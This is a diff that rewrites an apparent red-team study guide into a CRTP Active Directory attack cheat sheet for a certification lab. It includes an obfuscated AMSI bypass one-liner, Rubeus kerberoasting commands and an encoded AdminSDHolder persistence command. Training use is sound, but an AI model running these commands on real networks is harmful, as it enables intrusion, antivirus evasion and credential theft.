@@ -1,43 +1,51 @@
-CRTO | Zero Point Security | “The goal is not to get Domain Admin. The goal is to understand WHY you got Domain Admin.”
+# CRTP
+
+CRTP — Certified Red Team Professional
+Altered Security | Attacking & Defending Active Directory
 
 By DarcHacker.
 
-**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  
+LinkedIn:[www.linkedin.com/in/mostafa-ibrahim-60b543341](http://www.linkedin.com/in/mostafa-ibrahim-60b543341)
 
-##  Table of Contents
+---
+
+---
+
+## Table of Contents
 
 | # | Module | Key Topics |
-|---|--------|-----------|
-| 00 | [Lab Setup & Methodology](#00-lab-setup--methodology) | Invisi-Shell, AMSI, OpSec |
-| 01 | [AD Enumeration — PowerView](#01-ad-enumeration--powerview) | Users, groups, GPO, ACL, trusts |
-| 02 | [AD Enumeration — AD Module](#02-ad-enumeration--ad-module) | Native cmdlets, no extra tools |
-| 03 | [AD Enumeration — BloodHound](#03-ad-enumeration--bloodhound) | SharpHound, attack paths |
-| 04 | [Offensive PowerShell Tradecraft](#04-offensive-powershell-tradecraft) | AMSI bypass, CLM, logging bypass |
-| 05 | [Offensive .NET Tradecraft](#05-offensive-net-tradecraft) | Loaders, in-memory execution, MDE |
-| 06 | [Local Privilege Escalation](#06-local-privilege-escalation) | PowerUp, services, registry, apps |
-| 07 | [Lateral Movement](#07-lateral-movement) | PSRemoting, WMI, WinRM, PsExec |
-| 08 | [Domain Privilege Escalation — Kerberoasting](#08-domain-privilege-escalation--kerberoasting) | SPNs, TGS, hashcat |
-| 09 | [Domain Privilege Escalation — AS-REP Roasting](#09-domain-privilege-escalation--as-rep-roasting) | No preauth, hash crack |
-| 10 | [Domain Privilege Escalation — Unconstrained Delegation](#10-domain-privilege-escalation--unconstrained-delegation) | TGT extraction, PrintSpooler |
-| 11 | [Domain Privilege Escalation — Constrained Delegation](#11-domain-privilege-escalation--constrained-delegation) | S4U2Self, S4U2Proxy, Rubeus |
-| 12 | [Domain Privilege Escalation — RBCD](#12-domain-privilege-escalation--resource-based-constrained-delegation) | Computer object abuse |
-| 13 | [Domain Privilege Escalation — ACL Abuse](#13-domain-privilege-escalation--acl-abuse) | GenericAll, WriteDACL, ForceChangePassword |
-| 14 | [Domain Privilege Escalation — DNS Admins](#14-domain-privilege-escalation--dns-admins) | DLL injection via DNS |
-| 15 | [Credential Theft & Mimikatz](#15-credential-theft--mimikatz) | LSASS, SAM, logon passwords |
-| 16 | [Domain Persistence — Golden Ticket](#16-domain-persistence--golden-ticket) | krbtgt abuse |
-| 17 | [Domain Persistence — Silver Ticket](#17-domain-persistence--silver-ticket) | Service TGS forgery |
-| 18 | [Domain Persistence — Diamond Ticket](#18-domain-persistence--diamond-ticket) | Modify existing TGT |
-| 19 | [Domain Persistence — Skeleton Key](#19-domain-persistence--skeleton-key) | Universal password backdoor |
-| 20 | [Domain Persistence — DSRM](#20-domain-persistence--dsrm) | DC local admin abuse |
-| 21 | [Domain Persistence — Custom SSP](#21-domain-persistence--custom-ssp) | Track logons, credential capture |
-| 22 | [Domain Persistence — ACL Backdoors](#22-domain-persistence--acl-backdoors) | AdminSDHolder, DCSync rights |
-| 23 | [Domain Persistence — Security Descriptors](#23-domain-persistence--security-descriptors) | WMI, PSRemoting, RemoteReg |
-| 24 | [Cross-Domain Attacks — Child to Forest Root](#24-cross-domain-attacks--child-to-forest-root) | Trust tickets, krbtgt hash |
-| 25 | [Cross-Forest Trust Attacks](#25-cross-forest-trust-attacks) | SID history, inter-forest TGT |
-| 26 | [MSSQL Server Attacks](#26-mssql-server-attacks) | PowerUpSQL, linked servers, xp_cmdshell |
-| 27 | [Defenses & Detection Bypasses](#27-defenses--detection-bypasses) | MDI, Defender, logging |
-| 28 | [Sliver C2 Framework](#28-sliver-c2-framework) | Beacons, pivoting, operations |
-| 29 | [Essential Resources & Links](#29-essential-resources--links) | Tools, websites, references |
+| --- | --- | --- |
+| 00 | [Lab Setup & Methodology](about:blank#00-lab-setup--methodology) | Invisi-Shell, AMSI, OpSec |
+| 01 | [AD Enumeration — PowerView](about:blank#01-ad-enumeration--powerview) | Users, groups, GPO, ACL, trusts |
+| 02 | [AD Enumeration — AD Module](about:blank#02-ad-enumeration--ad-module) | Native cmdlets, no extra tools |
+| 03 | [AD Enumeration — BloodHound](about:blank#03-ad-enumeration--bloodhound) | SharpHound, attack paths |
+| 04 | [Offensive PowerShell Tradecraft](about:blank#04-offensive-powershell-tradecraft) | AMSI bypass, CLM, logging bypass |
+| 05 | [Offensive .NET Tradecraft](about:blank#05-offensive-net-tradecraft) | Loaders, in-memory execution, MDE |
+| 06 | [Local Privilege Escalation](about:blank#06-local-privilege-escalation) | PowerUp, services, registry, apps |
+| 07 | [Lateral Movement](about:blank#07-lateral-movement) | PSRemoting, WMI, WinRM, PsExec |
+| 08 | [Domain Privilege Escalation — Kerberoasting](about:blank#08-domain-privilege-escalation--kerberoasting) | SPNs, TGS, hashcat |
+| 09 | [Domain Privilege Escalation — AS-REP Roasting](about:blank#09-domain-privilege-escalation--as-rep-roasting) | No preauth, hash crack |
+| 10 | [Domain Privilege Escalation — Unconstrained Delegation](about:blank#10-domain-privilege-escalation--unconstrained-delegation) | TGT extraction, PrintSpooler |
+| 11 | [Domain Privilege Escalation — Constrained Delegation](about:blank#11-domain-privilege-escalation--constrained-delegation) | S4U2Self, S4U2Proxy, Rubeus |
+| 12 | [Domain Privilege Escalation — RBCD](about:blank#12-domain-privilege-escalation--resource-based-constrained-delegation) | Computer object abuse |
+| 13 | [Domain Privilege Escalation — ACL Abuse](about:blank#13-domain-privilege-escalation--acl-abuse) | GenericAll, WriteDACL, ForceChangePassword |
+| 14 | [Domain Privilege Escalation — DNS Admins](about:blank#14-domain-privilege-escalation--dns-admins) | DLL injection via DNS |
+| 15 | [Credential Theft & Mimikatz](about:blank#15-credential-theft--mimikatz) | LSASS, SAM, logon passwords |
+| 16 | [Domain Persistence — Golden Ticket](about:blank#16-domain-persistence--golden-ticket) | krbtgt abuse |
+| 17 | [Domain Persistence — Silver Ticket](about:blank#17-domain-persistence--silver-ticket) | Service TGS forgery |
+| 18 | [Domain Persistence — Diamond Ticket](about:blank#18-domain-persistence--diamond-ticket) | Modify existing TGT |
+| 19 | [Domain Persistence — Skeleton Key](about:blank#19-domain-persistence--skeleton-key) | Universal password backdoor |
+| 20 | [Domain Persistence — DSRM](about:blank#20-domain-persistence--dsrm) | DC local admin abuse |
+| 21 | [Domain Persistence — Custom SSP](about:blank#21-domain-persistence--custom-ssp) | Track logons, credential capture |
+| 22 | [Domain Persistence — ACL Backdoors](about:blank#22-domain-persistence--acl-backdoors) | AdminSDHolder, DCSync rights |
+| 23 | [Domain Persistence — Security Descriptors](about:blank#23-domain-persistence--security-descriptors) | WMI, PSRemoting, RemoteReg |
+| 24 | [Cross-Domain Attacks — Child to Forest Root](about:blank#24-cross-domain-attacks--child-to-forest-root) | Trust tickets, krbtgt hash |
+| 25 | [Cross-Forest Trust Attacks](about:blank#25-cross-forest-trust-attacks) | SID history, inter-forest TGT |
+| 26 | [MSSQL Server Attacks](about:blank#26-mssql-server-attacks) | PowerUpSQL, linked servers, xp_cmdshell |
+| 27 | [Defenses & Detection Bypasses](about:blank#27-defenses--detection-bypasses) | MDI, Defender, logging |
+| 28 | [Sliver C2 Framework](about:blank#28-sliver-c2-framework) | Beacons, pivoting, operations |
+| 29 | [CRTP Exam Strategy & Checklists](about:blank#29-crtp-exam-strategy--checklists) | 24-hour roadmap, scoring |
+| 30 | [Essential Resources & Links](about:blank#30-essential-resources--links) | Tools, websites, references |
 
 ---
 
@@ -125,7 +133,8 @@ STEP 10: Document everything — submit report
 ## 01 AD Enumeration — PowerView
 
 > PowerView is the primary enumeration tool in CRTP.
-> Load it inside an Invisi-Shell session to bypass AMSI.
+Load it inside an Invisi-Shell session to bypass AMSI.
+> 
 
 ### Loading PowerView
 
@@ -240,7 +249,7 @@ Find-DomainUserLocation
 $computers = Get-DomainComputer | select -ExpandProperty dnshostname
 foreach($c in $computers) {
     $result = Invoke-Command -ComputerName $c -ScriptBlock {whoami} -ErrorAction SilentlyContinue
-    if($result) { Write-Host "[+] PSRemote: $c — $result" }
+    if($result) { Write-Host "[+] PSRemote:$c —$result" }
 }
 
 # Invoke-UserHunter (find DA sessions)
@@ -357,7 +366,8 @@ Get-DomainTrust | select SourceName,TargetName,TrustAttributes
 ## 02 AD Enumeration — AD Module
 
 > Built-in AD module — already signed by Microsoft, less likely to trigger alerts.
-> No need to bypass AMSI for these cmdlets.
+No need to bypass AMSI for these cmdlets.
+> 
 
 ### Loading the AD Module
 
@@ -417,7 +427,8 @@ Get-ADDefaultDomainPasswordPolicy
 ## 03 AD Enumeration — BloodHound
 
 > BloodHound is the most powerful tool for visualizing attack paths in Active Directory.
-> CRTP requires SharpHound for collection and BloodHound GUI for analysis.
+CRTP requires SharpHound for collection and BloodHound GUI for analysis.
+> 
 
 ### SharpHound Data Collection
 
@@ -478,7 +489,7 @@ bloodhound &
 ╚═══════════════════════════════════════════════════════╝
 ```
 
-```cypher
+```
 -- Custom Cypher queries in BloodHound search box:
 
 -- Find all paths from student1 to Domain Admins
@@ -516,7 +527,8 @@ MATCH p=(u:User {name:"STUDENT1@DOLLARCORP.MONEYCORP.LOCAL"})-[r]->(n) RETURN p
 ### AMSI Bypass
 
 > AMSI (Anti-Malware Scan Interface) intercepts all PowerShell input and passes it to Windows Defender.
-> These bypasses patch AMSI in memory so scripts are not scanned.
+These bypasses patch AMSI in memory so scripts are not scanned.
+> 
 
 ```powershell
 # ── BYPASS 1: Reflection (most common in CRTP labs) ──────────────────────
@@ -676,7 +688,7 @@ Change these strings in source code or binary, and the tool won't be detected.
 
 Common bypasses:
 1. Rename functions  : amsiInitFailed → amsiBlocked
-2. Change strings    : "Mimikatz" → "M1m1k4tz"  
+2. Change strings    : "Mimikatz" → "M1m1k4tz"
 3. String encryption : Encrypt constants, decrypt at runtime
 4. Obfuscate         : Use tools like Invoke-Obfuscation
 5. Compile yourself  : Recompile with modified class/method names
@@ -691,7 +703,8 @@ Always use those — they are already bypassed for the lab environment.
 ## 06 Local Privilege Escalation
 
 > CRTP is an assumed breach scenario — but sometimes you need to escalate
-> on your local machine before moving to other hosts.
+on your local machine before moving to other hosts.
+> 
 
 ### PowerUp — Automated Privesc Discovery
 
@@ -1831,7 +1844,7 @@ Invoke-Command -Session $sess -ScriptBlock {
 # Force SDProp manually via task:
 Invoke-Command -ComputerName dcorp-dc -ScriptBlock {
     $cmd = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc " +
-           [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Import-Module ActiveDirectory; $sd = Get-ADObject 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'; Set-ADObject 'CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' -Replace @{nTSecurityDescriptor=$sd.nTSecurityDescriptor}"))
+           [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Import-Module ActiveDirectory;$sd = Get-ADObject 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'; Set-ADObject 'CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' -Replace @{nTSecurityDescriptor=$sd.nTSecurityDescriptor}"))
 }
 
 # After propagation, student1 has GenericAll on ALL Domain Admins
@@ -2283,25 +2296,167 @@ execute-assembly /kali/SharpHound.exe -c All
 
 ---
 
+## 29 CRTP Exam Strategy & Checklists
 
+### Exam Overview
 
-## 29 Essential Resources & Links
+```
+╔═══════════════════════════════════════════════════════════════╗
+║  24-HOUR HANDS-ON EXAM                                       ║
+║  5 Target machines + 1 Foothold machine                      ║
+║  Environment: Fully patched Windows + Defender + MDI active  ║
+║  Goal: Complete all challenges                               ║
+║  Report: Submit detailed solutions + mitigations             ║
+║  No full writeup needed, but evidence required               ║
+╚═══════════════════════════════════════════════════════════════╝
+
+Exam lab:
+  student (foothold)
+    └── machine1  (domain member)
+    └── machine2  (domain member)
+    └── machine3  (domain member / DC)
+    └── machine4  (parent domain DC / forest root)
+    └── machine5  (additional domain / linked)
+```
+
+### Pre-Exam Setup Checklist
+
+```
+[ ] VPN connected — test ping to all machines
+[ ] Start Invisi-Shell on student machine immediately
+[ ] AMSI bypass in each new PS session
+[ ] Prepare tools: SafetyKatz, Rubeus, PowerView, BloodHound, PowerUpSQL
+[ ] Start Sliver server + listener (if using C2)
+[ ] Set up Python HTTP server for file transfers
+[ ] Open note-taking tool (Obsidian/CherryTree) — one folder per machine
+[ ] Check: hostname, whoami, domain, DC name, domain SID
+```
+
+### Attack Path Order
+
+```
+PHASE 1: Enumerate Everything (DO NOT skip)
+  [ ] Run PowerView: users, groups, ACLs, SPNs, delegation, trusts
+  [ ] Run BloodHound SharpHound collection
+  [ ] Analyze BloodHound: "Shortest Paths to DA"
+  [ ] Identify: Kerberoastable users, AS-REP users, delegation
+  [ ] Identify: Local admin rights for student1
+  [ ] Identify: Interesting ACLs
+
+PHASE 2: Get Local Admin (if not already)
+  [ ] Run Find-LocalAdminAccess
+  [ ] Check Jenkins / other apps for RCE
+  [ ] Run PowerUp for local privesc
+
+PHASE 3: Credential Collection
+  [ ] PSRemote to accessible machines
+  [ ] SafetyKatz logonpasswords on each accessible machine
+  [ ] Look for high-value accounts (svcadmin, webadmin, etc.)
+
+PHASE 4: Domain Privilege Escalation (pick the easiest path)
+  [ ] Kerberoast → crack → use credentials
+  [ ] Unconstrained delegation + PrintSpooler → steal DA TGT
+  [ ] Constrained delegation → S4U to DA
+  [ ] ACL abuse → add to DA group or DCSync rights
+
+PHASE 5: Persistence (do this BEFORE moving to forest)
+  [ ] DCSync → get krbtgt hash
+  [ ] Forge Golden Ticket
+  [ ] Add AdminSDHolder ACE
+  [ ] Set DCSync ACL on domain object
+
+PHASE 6: Cross-Domain (Child → Forest Root)
+  [ ] Method 1: Child krbtgt + EA SID history → access forest root
+  [ ] Method 2: Trust ticket
+
+PHASE 7: Cross-Forest (if applicable)
+  [ ] Enumerate trusts to eurocorp.local
+  [ ] Kerberoast across trust
+  [ ] SID history injection (if filtering disabled)
+  [ ] MSSQL linked servers across forest
+
+PHASE 8: Document + Report
+  [ ] Screenshot for every step
+  [ ] Include hostname + whoami in every screenshot
+  [ ] Document mitigations for each technique
+```
+
+### Documentation Requirements for Each Machine
+
+```
+Per machine, document:
+  ✓ Initial enumeration findings
+  ✓ Attack path chosen (explain WHY)
+  ✓ Commands run (exact copy-paste)
+  ✓ Tool output (screenshots + text)
+  ✓ Privilege obtained (screenshot: whoami + hostname)
+  ✓ Credentials/hashes obtained
+  ✓ Mitigation recommendation
+
+Screenshot format:
+  [whoami output]
+  [hostname]
+  [flag or proof of DA access]
+  [ip config / domain info]
+  All in ONE screenshot per machine.
+```
+
+### Quick Command Reference (Exam Day)
+
+```powershell
+# ── STARTUP SEQUENCE ─────────────────────────────────────────────────────
+# 1. Run Invisi-Shell
+C:\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat
+
+# 2. AMSI bypass (run in every new PS session):
+S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+
+# 3. Load PowerView:
+. C:\AD\Tools\PowerView.ps1
+
+# 4. Quick domain info:
+Get-Domain; Get-DomainController; Get-DomainSID
+
+# 5. Find local admin access:
+Find-LocalAdminAccess
+
+# 6. Enumerate ACLs:
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student"}
+
+# 7. Run BloodHound:
+. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -Verbose
+
+# 8. Check Kerberoastable:
+.\Rubeus.exe kerberoast /outfile:kerb.txt
+
+# 9. Check AS-REP roastable:
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# 10. Check delegation:
+Get-DomainComputer -Unconstrained | select samaccountname
+Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
+```
+
+---
+
+## 30 Essential Resources & Links
 
 ### Official Course
 
 | Resource | URL |
-|----------|-----|
+| --- | --- |
 | CRTP Course Page | https://www.alteredsecurity.com/adlab |
 | Altered Security | https://www.alteredsecurity.com |
 | Lab Portal | https://enterprisesecurity.io |
 | CRTP FAQ Blog | https://www.alteredsecurity.com/post/certified-red-team-professional-crtp |
 | Bootcamp Info | https://www.alteredsecurity.com/crtp-bootcamp |
-| Certification Path (CRTE) | https://www.alteredsecurity.com/redteamlab |
+| Certification Path (CRTP) | https://www.alteredsecurity.com/redteamlab |
 
 ### Core Tools Used in CRTP
 
 | Tool | Use | URL |
-|------|-----|-----|
+| --- | --- | --- |
 | PowerView | AD enumeration | https://github.com/PowerShellMafia/PowerSploit |
 | BloodHound | Attack path mapping | https://github.com/BloodHoundAD/BloodHound |
 | SharpHound | BloodHound data collection | https://github.com/BloodHoundAD/SharpHound |
@@ -2318,7 +2473,7 @@ execute-assembly /kali/SharpHound.exe -c All
 ### Reference & Cheat Sheets
 
 | Resource | URL |
-|----------|-----|
+| --- | --- |
 | GTFOBins | https://gtfobins.github.io/ |
 | HackTricks AD | https://book.hacktricks.xyz/windows-hardening/active-directory-methodology |
 | The Hacker Recipes | https://www.thehacker.recipes/ |
@@ -2330,7 +2485,7 @@ execute-assembly /kali/SharpHound.exe -c All
 ### Understanding Kerberos (Deep Dive)
 
 | Resource | URL |
-|----------|-----|
+| --- | --- |
 | Kerberos Explained | https://adsecurity.org/?p=1389 |
 | Kerberoasting Paper | https://www.blackhat.com/docs/us-14/materials/us-14-Ramiras-Kerberoasting.pdf |
 | Golden Ticket Article | https://adsecurity.org/?p=1640 |
@@ -2342,7 +2497,7 @@ execute-assembly /kali/SharpHound.exe -c All
 ### Lab Practice (CRTP-level boxes)
 
 | Platform | Box/Path | URL |
-|----------|----------|-----|
+| --- | --- | --- |
 | Hack The Box | Forest, Monteverde, Cascade, Active | https://app.hackthebox.com |
 | HTB Pro Labs | Offshore, RastaLabs | https://app.hackthebox.com/prolabs |
 | TryHackMe | AD paths | https://tryhackme.com |
@@ -2407,7 +2562,7 @@ Get-DomainPolicy                Get-DomainSID
 
 # ═══ USERS ════════════════════════════════════════════════════
 Get-DomainUser                  Get-DomainUser -SPN
-Get-DomainUser -PreauthNotRequired               
+Get-DomainUser -PreauthNotRequired
 Find-DomainUserLocation
 
 # ═══ GROUPS ═══════════════════════════════════════════════════
@@ -2471,8 +2626,10 @@ Add-DomainGroupMember           Set-DomainObjectOwner
 .\Rubeus.exe hash /password:<p> /user:<u> /domain:<d>
 ```
 
+---
+
 *CRTP | Altered Security | “The goal is not to get Domain Admin. The goal is to understand WHY you got Domain Admin.”*
 
 By DarcHacker.
 
-LinkedIn:www.linkedin.com/in/mostafa-ibrahim-60b543341
+LinkedIn:[www.linkedin.com/in/mostafa-ibrahim-60b543341](http://www.linkedin.com/in/mostafa-ibrahim-60b543341)
